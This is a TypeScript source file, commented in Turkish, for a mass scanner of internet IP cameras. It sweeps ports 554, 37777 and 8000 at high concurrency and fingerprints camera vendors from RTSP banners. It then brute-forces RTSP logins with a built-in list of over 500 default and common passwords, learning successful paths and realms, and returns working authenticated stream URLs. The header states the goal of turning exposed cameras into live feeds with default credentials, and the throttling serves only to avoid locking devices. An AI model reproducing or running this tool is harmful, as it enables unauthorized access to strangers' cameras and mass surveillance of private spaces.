// V2 — Mass scanner. Kamera portlarına (554/37777/8000) yüksek eşzamanlı TCP
// tarama + hızlı RTSP auth. Amaç: açık RTSP'yi saniyede binlerce IP'de yakalayıp
// default credential ile canlıya çevirmek.

import * as net from 'net';
import { basicAuth } from './auth';

function tcpOpen(ip: string, port: number, timeoutMs: number): Promise<boolean> {
  return new Promise((resolve) => {
    const s = new net.Socket();
    let done = false;
    const finish = (v: boolean) => {
      if (done) return;
      done = true;
      s.destroy();
      resolve(v);
    };
    s.setNoDelay(true);
    s.setTimeout(timeoutMs, () => finish(false));
    s.once('connect', () => finish(true));
    s.once('error', () => finish(false));
    s.connect(port, ip);
  });
}

export async function scanPort(
  ips: string[],
  port: number,
  concurrency = 3000,
  timeoutMs = 1500,
): Promise<string[]> {
  const open: string[] = [];
  let idx = 0;
  const n = Math.min(concurrency, Math.max(ips.length, 1));
  const workers = Array.from({ length: n }, async () => {
    while (idx < ips.length) {
      const ip = ips[idx++];
      if (await tcpOpen(ip, port, timeoutMs)) open.push(ip);
    }
  });
  await Promise.all(workers);
  return open;
}

// TCP-open yeterli değil — cihazın GERÇEKTEN RTSP konuştuğunu doğrula.
// ISP NAT/yalan portlar burada elenir. 200 veya 401 dönerse gerçek kamera.
export async function rtspAlive(host: string, port = 554, timeoutMs = 1500): Promise<boolean> {
  return new Promise((resolve) => {
    const s = new net.Socket();
    let done = false;
    const finish = (v: boolean) => {
      if (done) return;
      done = true;
      s.destroy();
      resolve(v);
    };
    let buf = '';
    s.setNoDelay(true);
    s.setTimeout(timeoutMs, () => finish(false));
    s.once('connect', () => {
      s.write(`DESCRIBE rtsp://${host}:${port}/ RTSP/1.0\r\nCSeq: 1\r\nAccept: application/sdp\r\nUser-Agent: OneView/2.0\r\n\r\n`);
    });
    s.once('error', () => finish(false));
    s.on('data', (d) => {
      buf += d.toString('utf8');
      if (/^RTSP\/1\.\d\s\d{3}/i.test(buf)) finish(true);
    });
    s.connect(port, host);
  });
}

function rtspTry(
  host: string,
  port: number,
  path: string,
  user: string,
  pass: string,
  timeoutMs: number,
): Promise<boolean> {
  return new Promise((resolve) => {
    const s = new net.Socket();
    let done = false;
    const finish = (v: boolean) => {
      if (done) return;
      done = true;
      s.destroy();
      resolve(v);
    };
    s.setNoDelay(true);
    s.setTimeout(timeoutMs, () => finish(false));
    s.once('connect', () => {
      let req = `DESCRIBE rtsp://${host}:${port}${path} RTSP/1.0\r\nCSeq: 1\r\nAccept: application/sdp\r\nUser-Agent: OneView/2.0\r\n`;
      if (user) req += `Authorization: ${basicAuth(user, pass)}\r\n`;
      req += '\r\n';
      s.write(req);
    });
    s.once('error', () => finish(false));
    s.on('data', (buf) => {
      const t = buf.toString('utf8');
      if (/^RTSP\/1\.0 200/i.test(t)) finish(true);
      else if (/^RTSP\/1\.0 \d/i.test(t)) finish(false);
    });
  });
}

// OPTIONS isteği cred'i GERÇEKTEN doğrular (DESCRIBE bazı kameralarda lenient).
export async function rtspOptions(
  host: string,
  port: number,
  authHeader: string | null,
  timeoutMs = 2000,
): Promise<boolean> {
  return new Promise((resolve) => {
    const s = new net.Socket();
    let done = false;
    const finish = (v: boolean) => {
      if (done) return;
      done = true;
      s.destroy();
      resolve(v);
    };
    let buf = '';
    s.setNoDelay(true);
    s.setTimeout(timeoutMs, () => finish(false));
    s.once('connect', () => {
      let req = `OPTIONS rtsp://${host}:${port}/ RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: OneView/2.0\r\n`;
      if (authHeader) req += `Authorization: ${authHeader}\r\n`;
      req += '\r\n';
      s.write(req);
    });
    s.once('error', () => finish(false));
    s.on('data', (d) => {
      buf += d.toString('utf8');
      if (/^RTSP\/1\.\d\s200/i.test(buf)) finish(true);
      else if (/^RTSP\/1\.\d\s\d{3}/i.test(buf)) finish(false);
    });
    s.connect(port, host);
  });
}

// DESCRIBE ile RTSP banner'ını çek (vendor parmak izi için).
export async function rtspBanner(host: string, port: number, timeoutMs = 2500): Promise<string> {
  return new Promise((resolve) => {
    const s = new net.Socket();
    let buf = '';
    let done = false;
    const finish = () => {
      if (done) return;
      done = true;
      s.destroy();
      resolve(buf);
    };
    s.setNoDelay(true);
    s.setTimeout(timeoutMs, () => finish());
    s.once('connect', () => {
      s.write(`DESCRIBE rtsp://${host}:${port}/ RTSP/1.0\r\nCSeq: 1\r\nAccept: application/sdp\r\nUser-Agent: OneView/2.0\r\n\r\n`);
    });
    s.once('error', () => finish());
    s.on('data', (d) => {
      buf += d.toString('utf8');
      if (/^RTSP\/1\.\d\s\d{3}/i.test(buf) && /\r?\n\r?\n/.test(buf)) finish();
    });
    s.connect(port, host);
  });
}

// RTSP banner'ından vendor tespit et (Server header + WWW-Authenticate realm).
export function rtspVendor(banner: string): string {
  if (!banner) return 'generic';
  const server = /^server:\s*(.+)$/im.exec(banner)?.[1] || '';
  const realm = /realm="([^"]+)"/i.exec(banner)?.[1] || '';
  const hay = `${server} ${realm}`.toLowerCase();
  if (/dahua/.test(hay)) return 'dahua';
  if (/hikvision|hik-connect/.test(hay)) return 'hikvision';
  if (/\baxis\b|axis-/.test(hay)) return 'axis';
  if (/amcrest/.test(hay)) return 'amcrest';
  if (/foscam/.test(hay)) return 'foscam';
  if (/reolink/.test(hay)) return 'reolink';
  if (/vivotek/.test(hay)) return 'vivotek';
  if (/d-?link/.test(hay)) return 'dlink';
  if (/tp-?link/.test(hay)) return 'tplink';
  if (/panasonic/.test(hay)) return 'panasonic';
  if (/samsung|hanwha/.test(hay)) return 'samsung';
  if (/uniview|unv/.test(hay)) return 'uniview';
  if (/geovision/.test(hay)) return 'geovision';
  if (/axis|bosch|arecont|honeywell|pelco|sony|cp-plus|cp\s*plus/.test(hay)) return 'generic';
  return 'generic';
}

// --- 500+ yaygın/varsayılan kamera şifresi (olasılık sırası: tutanlar önce) ---
function buildMassCreds(): Array<[string, string]> {
  const out: Array<[string, string]> = [];
  const seen = new Set<string>();
  const add = (u: string, p: string) => {
    if (u.length > 32 || p.length > 32) return;
    const k = `${u}:${p}`;
    if (seen.has(k)) return;
    seen.add(k);
    out.push([u, p]);
  };
  const knownPw = [
    '', 'admin', '12345', '123456', '1234', '12345678', '123456789', '1234567890', 'password', 'pass', 'passwd',
    '888888', '666666', '88888888', '66666666', 'admin123', 'admin1234', 'admin12345', 'admin888', 'admin666',
    'admin@123', 'admin#123', 'Admin123', 'Admin12345', 'admin2020', 'admin2021', 'admin2022', 'admin2023', 'admin2024', 'admin2025', 'admin2026',
    '7ujMko0admin', '7ujMko0admin123', 'hik12345', 'hikvision', 'hikvision123', 'dahua', 'dahua123', 'dahua@123',
    'amcrest', 'axis', 'axis123', 'vizxv', 'xmhdipc', 'juantech', 'cat1029', 'apix', 'jvbzd', 'hi3518',
    'zlxx.', 'klv123', 'klv1234', 'Zte521', 'hsit', 'vhd1201', '6789p', 'anko', 'xc3511', '54321', 'jvc', 'meinsm',
    'supervisor', 'service', 'system', 'sysadmin', 'support', 'security', 'monitor', 'operator', 'master', 'manager',
    'default', 'changeme', 'secret', 'letmein', 'welcome', 'public', 'private', 'temp', 'temp123', 'test', 'demo',
    'cctv', 'camera', 'cam', 'ipcam', 'ipc', 'dvr', 'nvr', 'video', 'videocam', 'recorder', 'tech', 'install',
    'qwerty', 'qwerty123', 'abc123', 'a123456', 'a1b2c3', '1q2w3e', '1qaz2wsx', 'zxcvbnm', 'asdfgh', '123qwe',
    'P@ssw0rd', 'Password1', 'Password123', 'Password@123', 'P@ssword', 'Passw0rd', 'root123', 'toor', 'rootpass',
    '123', '12', '1', '0', '00', '000', '0000', '00000', '000000', '1111', '11111', '111111', '2222', '222222',
    '3333', '333333', '4444', '444444', '5555', '555555', '7777', '777777', '9999', '999999', '123123', '112233',
    '121212', '654321', '987654', '147258', '258369', '010203', '101010', '123321', '321321', '1010', '2020',
    'sifre', 'sifre123', 'sifre1234', 'sifrem', 'turkiye', 'istanbul', 'ankara', 'izmir', 'bursa', 'deneme',
    '123456a', '1a2b3c', 'abcd1234', 'abc12345', 'a12345', '4rfv5tgb', 'tlJwpbo6', 'Juanky2013',
  ];
  // 1) admin + bilinen şifreler (en yüksek olasılık → ilk denenir)
  for (const p of knownPw) add('admin', p);
  // 2) root + bilinen şifreler
  for (const p of knownPw) add('root', p);
  // 3) diğer kullanıcı adları
  const users = ['', 'user', 'guest', 'supervisor', 'service', 'Admin', 'administrator', 'support', 'default', 'cctv', 'ipcam', 'ubnt'];
  for (const u of users) for (const p of knownPw.slice(0, 55)) add(u, p);
  // 4) kelime + sayı/sembol kombinasyonları (dolgu)
  const words = ['admin', 'root', 'user', 'guest', 'test', 'demo', 'cctv', 'camera', 'cam', 'ipcam', 'dvr', 'nvr', 'video', 'password', 'pass', 'passwd', 'secret', 'master', 'supervisor', 'default', 'support', 'service', 'system', 'tech', 'security', 'monitor', 'sifre', 'turkiye'];
  const suffix = ['1', '12', '123', '1234', '12345', '123456', '2020', '2021', '2022', '2023', '2024', '2025', '01', '007'];
  for (const w of words) for (const s of suffix) add(w, w + s);
  return out;
}

export const MASS_CREDS: Array<[string, string]> = buildMassCreds();

// Global token-bucket — cihazları KİLİTLEMEMEK için toplam deneme hızını kısar.
class RateLimiter {
  private tokens: number;
  private last: number;
  constructor(private ratePerSec = 80, private burst = 40) {
    this.tokens = burst;
    this.last = Date.now();
  }
  async wait(): Promise<void> {
    for (;;) {
      const now = Date.now();
      this.tokens = Math.min(this.burst, this.tokens + ((now - this.last) * this.ratePerSec) / 1000);
      this.last = now;
      if (this.tokens >= 1) {
        this.tokens -= 1;
        return;
      }
      await new Promise((r) => setTimeout(r, 12));
    }
  }
}
const credLimiter = new RateLimiter(80, 40); // ~80 deneme/sn toplam

const QUICK_PATHS = [
  '/Streaming/Channels/101',
  '/Streaming/Channels/102',
  '/Streaming/Channels/1',
  '/cam/realmonitor?channel=1&subtype=0',
  '/cam/realmonitor?channel=1&subtype=1',
  '/live',
  '/onvif1',
  '/onvif2',
  '/h264/ch1/main/av_stream',
  '/h264/ch1/sub/av_stream',
  '/ISAPI/Streaming/Channels/101',
  '/media/video1',
  '/stream1',
  '/stream2',
  '/videoMain',
  '/video1',
  '/video2',
  '/axis-media/media.amp',
  '/live.sdp',
  '/live/ch00_0',
  '/mpeg4',
  '/h264',
  '/11',
  '/12',
  '/realmonitor?channel=1&subtype=0',
];

// ÖĞRENME: tutan path'ler öne alınır (oturum içi, anahtar/dosya gerekmez).
const HOT_PATHS: string[] = [];
function orderedPaths(): string[] {
  const seen = new Set<string>();
  const out: string[] = [];
  for (const p of [...HOT_PATHS, ...QUICK_PATHS]) {
    if (seen.has(p)) continue;
    seen.add(p);
    out.push(p);
  }
  return out;
}
function rememberPath(path: string): void {
  const i = HOT_PATHS.indexOf(path);
  if (i >= 0) HOT_PATHS.splice(i, 1);
  HOT_PATHS.unshift(path);
  if (HOT_PATHS.length > 20) HOT_PATHS.pop();
}

export const QUICK_CREDS: Array<[string, string]> = [
  ['', ''],
  ['admin', '12345'],
  ['admin', 'admin'],
  ['admin', ''],
  ['admin', '123456'],
  ['admin', '888888'],
  ['888888', '888888'],
  ['666666', '666666'],
  ['admin', '12345678'],
  ['admin', '123456789'],
  ['root', 'pass'],
  ['root', 'admin'],
  ['admin', 'admin1234'],
  ['admin', '7ujMko0admin'],
  ['admin', '1111'],
  ['admin', '666666'],
  ['admin', 'abc123'],
  ['admin', 'Admin12345'],
];

export interface QuickRtspResult {
  url: string;
  user: string;
  pass: string;
}

// Realm → tutan kimlik (oturum içi öğrenme — "B" maddesi).
const REALM_CREDS = new Map<string, Array<[string, string]>>();
export function realmHot(realm: string): Array<[string, string]> {
  return realm ? REALM_CREDS.get(realm) || [] : [];
}
function rememberRealm(realm: string, u: string, p: string): void {
  if (!realm) return;
  const list = REALM_CREDS.get(realm) || [];
  if (!list.some(([a, b]) => a === u && b === p)) list.unshift([u, p]);
  if (list.length > 8) list.pop();
  REALM_CREDS.set(realm, list);
}

// SETUP: önce TCP, olmazsa UDP. Bazı (özellikle eski) cihazlar "RTP/AVP/TCP;
// interleaved" transport'unu desteklemez → eski hâlde çalışan kamera "path yok"
// sanılıp ELENİRDİ (yanlış negatif). UDP client_port ile tekrar denenir.
function rtspSetupOk(
  host: string,
  port: number,
  path: string,
  user: string,
  pass: string,
  timeoutMs = 2500,
): Promise<boolean> {
  return setupWith(host, port, path, user, pass, 'RTP/AVP/TCP;unicast;interleaved=0-1', timeoutMs).then((ok) =>
    ok ? true : setupWith(host, port, path, user, pass, 'RTP/AVP;unicast;client_port=8000-8001', timeoutMs),
  );
}

// GERÇEK doğrulama: DESCRIBE 200+SDP bile yanıltıcı çıkıyor (kanıt: 78.161.95.254
// DESCRIBE'da SDP döndü ama ffmpeg'de "SETUP failed: 404 Stream Not Found").
// SETUP 200/461 = stream gerçekten var ve oynatılabilir (ffmpeg'in ilk adımı).
function setupWith(
  host: string,
  port: number,
  path: string,
  user: string,
  pass: string,
  transport: string,
  timeoutMs: number,
): Promise<boolean> {
  return new Promise((resolve) => {
    const s = new net.Socket();
    let done = false;
    let all = '';
    const fin = (v: boolean) => {
      if (done) return;
      done = true;
      try {
        s.destroy();
      } catch {
        /* noop */
      }
      resolve(v);
    };
    s.setNoDelay(true);
    s.setTimeout(timeoutMs, () => fin(false));
    s.once('connect', () => {
      let req = `SETUP rtsp://${host}:${port}${path} RTSP/1.0\r\nCSeq: 1\r\nTransport: ${transport}\r\nUser-Agent: OneView/2.0\r\n`;
      if (user) req += `Authorization: ${basicAuth(user, pass)}\r\n`;
      req += '\r\n';
      s.write(req);
    });
    s.once('error', () => fin(false));
    s.on('data', (d) => {
      all += d.toString('utf8');
      const m = /^RTSP\/1\.0 (\d{3})/i.exec(all);
      if (m) fin(m[1] === '200' || m[1] === '461'); // 461 = transport uyumsuz ama stream VAR
    });
    s.connect(port, host);
  });
}

// ⚠️ 200 ama SDP yok = sahte: cihaz auth'u kabul ediyor ama o path'te stream yok
// (ffmpeg'de "SETUP failed: 404 Stream Not Found" olarak patlıyordu — loglarda kanıtlı).
function rtspTryStatus(
  host: string,
  port: number,
  path: string,
  user: string,
  pass: string,
  timeoutMs: number,
): Promise<{ status: 'ok' | 'deny' | 'none'; realm: string }> {
  return new Promise((resolve) => {
    const s = new net.Socket();
    let done = false;
    let all = '';
    let waitSdp: NodeJS.Timeout | null = null;
    const realmOf = () => (/realm="([^"]*)"/i.exec(all) || [])[1] || '';
    const fin = (status: 'ok' | 'deny' | 'none') => {
      if (done) return;
      done = true;
      if (waitSdp) clearTimeout(waitSdp);
      s.destroy();
      resolve({ status, realm: realmOf() });
    };
    s.setNoDelay(true);
    s.setTimeout(timeoutMs, () => fin('none'));
    s.once('connect', () => {
      let req = `DESCRIBE rtsp://${host}:${port}${path} RTSP/1.0\r\nCSeq: 1\r\nAccept: application/sdp\r\nUser-Agent: OneView/2.0\r\n`;
      if (user) req += `Authorization: ${basicAuth(user, pass)}\r\n`;
      req += '\r\n';
      s.write(req);
    });
    s.once('error', () => fin('none'));
    s.on('data', (buf) => {
      all += buf.toString('utf8');
      if (/^RTSP\/1\.0 200/i.test(all)) {
        if (/v=0\r?\n|m=video/i.test(all)) fin('ok');
        else if (!waitSdp) waitSdp = setTimeout(() => fin('none'), 600); // SDP'ye 600ms tanı
      } else if (/^RTSP\/1\.0 \d/i.test(all)) {
        fin('deny');
      }
    });
    s.connect(port, host);
  });
}

// ⚠️ 150 → 40: Hikvision/Dahua ~10 hatalı denemeden sonra KİLİTLENİR ve her cred'e
// 401 döner. Tarama, o anda oynayan çalışan kamerayı da kilitleyip düşürüyordu.
const MAX_CRED_TRIES = 40;
export async function quickRtsp(
  host: string,
  port = 554,
  timeoutMs = 2000,
  hint: Array<[string, string]> = [],
): Promise<QuickRtspResult | null> {
  // DESCRIBE tabanlı cred testi + path keşfi. 500+ cred, GLOBAL hız sınırlı (80/sn).
  // Sıra: realm-hot → global hot-list (öğrenilmiş) → tam havuz. Kilit koruması açık.
  const PROBE = ['/Streaming/Channels/101', '/cam/realmonitor?channel=1&subtype=0', '/onvif1'];

  // Realm keşfi (auth'suz tek DESCRIBE) — aynı realm'de tutan kimlik öne gelir.
  const first = await rtspTryStatus(host, port, PROBE[0], '', '', timeoutMs);
  const realm = first.realm || '';

  const ordered: Array<[string, string]> = [];
  const seenC = new Set<string>();
  const pushC = (u: string, p: string) => {
    const k = `${u}:${p}`;
    if (seenC.has(k)) return;
    seenC.add(k);
    ordered.push([u, p]);
  };
  for (const [u, p] of realmHot(realm)) pushC(u, p);
  for (const [u, p] of hint) pushC(u, p);
  for (const [u, p] of MASS_CREDS) pushC(u, p);

  let tries = 0;
  let consecutiveNone = 0;
  for (const [u, p] of ordered) {
    if (tries >= MAX_CRED_TRIES || consecutiveNone >= 5) break;
    await credLimiter.wait();
    tries++;
    let res: 'ok' | 'deny' | 'none' = 'none';
    let rl = realm;
    for (const path of PROBE) {
      const st = await rtspTryStatus(host, port, path, u, p, timeoutMs);
      res = st.status;
      if (st.realm) rl = st.realm;
      if (res !== 'deny') break;
    }
    if (res === 'ok') {
      rememberRealm(rl, u, p);
      const authPart = u ? `${encodeURIComponent(u)}:${encodeURIComponent(p)}@` : '';
      // SETUP ile GERÇEK doğrulama. (Eskiden DESCRIBE yeterli sayılıp SDP'siz/
      // SETUP'sız URL kaydediliyordu → arayüzde "hata veren kameralar" oluşuyordu.)
      for (const path of PROBE) {
        if (await rtspSetupOk(host, port, path, u, p, timeoutMs)) {
          rememberPath(path);
          return { url: `rtsp://${authPart}${host}:${port}${path}`, user: u, pass: p };
        }
      }
      for (const path of orderedPaths()) {
        if (await rtspSetupOk(host, port, path, u, p, timeoutMs)) {
          rememberPath(path);
          return { url: `rtsp://${authPart}${host}:${port}${path}`, user: u, pass: p };
        }
      }
      // SETUP hiç tutmadı → sahte pozitif. Kaydetme, sonraki cred'e geç.
      consecutiveNone++;
      continue;
    }
    if (res === 'none') consecutiveNone++;
    else consecutiveNone = 0; // deny → cihaz canlı, kilit yok
  }
  return null;
}
